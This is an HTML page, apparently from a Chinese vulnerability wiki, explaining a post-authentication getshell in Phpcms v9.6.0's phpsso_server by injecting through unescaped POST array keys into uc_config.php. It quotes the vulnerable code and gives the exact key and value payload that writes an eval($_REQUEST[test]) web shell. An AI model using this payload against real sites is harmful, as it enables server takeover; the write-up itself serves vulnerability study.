@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpcms/Phpcms%20v9.6.0%E5%90%8E%E5%8F%B0getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Phpcms v9.6.0后台getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Phpcms v9.6.0\u540e\u53f0getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        Phpcms v9.6.1 任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
+        Phpcms v9.6.0 任意文件上传
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpcms-v960getshell">Phpcms v9.6.0后台getshell<a class="headerlink" href="#phpcms-v960getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>phpsso_server 后台getshell</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Phpcms v9.6.0</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>漏洞来自于ROOTDIR/phpsso_server/phpcms/modules/admin/system.php</p>
+<div class="codehilite"><pre><span></span><code><span class="kr">public</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">uc</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;dosubmit&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">isset</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">$data</span><span class="p">[</span><span class="s1">&#39;ucuse&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">isset</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;ucuse&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">intval</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;ucuse&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">intval</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;ucuse&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">$filepath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CACHE_PATH</span><span class="p">.</span><span class="s1">&#39;configs&#39;</span><span class="p">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">.</span><span class="s1">&#39;system.php&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">include</span><span class="w"> </span><span class="nx">$filepath</span><span class="p">;</span>
+<span class="w">            </span><span class="nx">$uc_config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="cp">&lt;?php</span> <span class="s1">&#39;.&quot;\ndefine(&#39;</span><span class="nx">UC_CONNECT</span><span class="s1">&#39;, &#39;</span><span class="nx">mysql</span><span class="s1">&#39;);\n&quot;;</span>
+<span class="s1">            foreach ($data as $k =&gt; $v) {</span>
+<span class="s1">                $old[] = &quot;&#39;</span><span class="nv">$k</span><span class="s1">&#39;=&gt;&#39;</span><span class="s2">&quot;.(isset(</span><span class="si">$config[$k]</span><span class="s2">) ? </span><span class="si">$config[$k]</span><span class="s2"> : </span><span class="si">$v</span><span class="s2">).&quot;</span><span class="s1">&#39;,&quot;;</span>
+<span class="s1">                $new[] = &quot;&#39;</span><span class="nv">$k</span><span class="s1">&#39;=&gt;&#39;</span><span class="nv">$v</span><span class="s1">&#39;,&quot;;</span>
+<span class="s1">                $uc_config .= &quot;define(&#39;</span><span class="s2">&quot;.strtoupper(</span><span class="si">$k</span><span class="s2">).&quot;</span><span class="s1">&#39;, &#39;</span><span class="nv">$v</span><span class="s1">&#39;);\n&quot;;</span>
+<span class="s1">            }</span>
+<span class="s1">            $html = file_get_contents($filepath);</span>
+<span class="s1">            $html = str_replace($old, $new, $html);</span>
+<span class="s1">            $uc_config_filepath = CACHE_PATH.&#39;</span><span class="nx">configs</span><span class="s1">&#39;.DIRECTORY_SEPARATOR.&#39;</span><span class="nx">uc_config</span><span class="o">.</span><span class="nx">php</span><span class="s1">&#39;;</span>
+<span class="s1">            @file_put_contents($uc_config_filepath, $uc_config);</span>
+<span class="s1">            @file_put_contents($filepath, $html);</span>
+<span class="s1">            $this-&gt;db-&gt;insert(array(&#39;</span><span class="nx">name</span><span class="s1">&#39;=&gt;&#39;</span><span class="nx">ucenter</span><span class="s1">&#39;, &#39;</span><span class="nx">data</span><span class="s1">&#39;=&gt;array2string($data)), 1,1);</span>
+<span class="s1">            showmessage(L(&#39;</span><span class="nx">operation_success</span><span class="s1">&#39;), HTTP_REFERER);</span>
+<span class="s1">        }</span>
+<span class="s1">        $data = array();</span>
+<span class="s1">        $r = $this-&gt;db-&gt;get_one(array(&#39;</span><span class="nx">name</span><span class="s1">&#39;=&gt;&#39;</span><span class="nx">ucenter</span><span class="s1">&#39;));</span>
+<span class="s1">        if ($r) {</span>
+<span class="s1">            $data = string2array($r[&#39;</span><span class="nx">data</span><span class="s1">&#39;]);</span>
+<span class="s1">        }</span>
+<span class="s1">        include $this-&gt;admin_tpl(&#39;</span><span class="nx">system_uc</span><span class="err">&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div>
+
+<p>来自这段中的</p>
+<p>$data = isset($_POST[\'data\']) ? $_POST[\'data\'] : \'\';</p>
+<p>和</p>
+<p>foreach ($data as $k =&gt; $v) {$old[] = \"\'$k\'=&gt;\'\".(isset($config[$k]) ? $config[$k] :
+$v).\"\',\";$new[] = \"\'$k\'=&gt;\'$v\',\";$uc_config .= \"define(\'\".strtoupper($k).\"\', \'$v\');\n\";}</p>
+<p>这里接收post[\'data\']数据中的key，value并写入配置文件ROOTDIR/phpsso_server/caches/configs/uc_config.php中</p>
+<p>在ROOTDIR/phpcms/libs/classes/param.class.php中</p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">get_magic_quotes_gpc</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">_POST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_addslashes</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">);</span>
+<span class="w">            </span><span class="o">$</span><span class="n">_GET</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_addslashes</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">);</span>
+<span class="w">            </span><span class="o">$</span><span class="n">_REQUEST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_addslashes</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">);</span>
+<span class="w">            </span><span class="o">$</span><span class="n">_COOKIE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_addslashes</span><span class="p">(</span><span class="o">$</span><span class="n">_COOKIE</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+</code></pre></div>
+
+<p>全局过滤了post，但是这里只过滤了value，并没有过滤key</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.0%E5%90%8E%E5%8F%B0getshell/media/rId24.png" /></p>
+<p>在这个地方，我们可以构造</p>
+<div class="codehilite"><pre><span></span><code>name=&quot;data[uc_api&#39;,&#39;11&#39;);/*]&quot;
+</code></pre></div>
+
+<p>并在Ucenter api 地址输入:</p>
+<div class="codehilite"><pre><span></span><code><span class="o">*/</span><span class="n">eval</span><span class="p">(</span><span class="err">$</span><span class="n">_REQUEST</span><span class="o">[</span><span class="n">test</span><span class="o">]</span><span class="p">);</span><span class="o">//</span>
+</code></pre></div>
+
+<p>再进行缓存更新</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.0%E5%90%8E%E5%8F%B0getshell/media/rId25.png" /></p>
+<p>就成功写入了一句话</p>
+<p><img alt="" src="../resource/Phpcmsv9.6.0%E5%90%8E%E5%8F%B0getshell/media/rId26.png" /></p>
+<p><img alt="" src="../resource/Phpcmsv9.6.0%E5%90%8E%E5%8F%B0getshell/media/rId27.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        Phpcms v9.6.1 任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20v9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="btn btn-xs btn-link">
+        Phpcms v9.6.0 任意文件上传
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
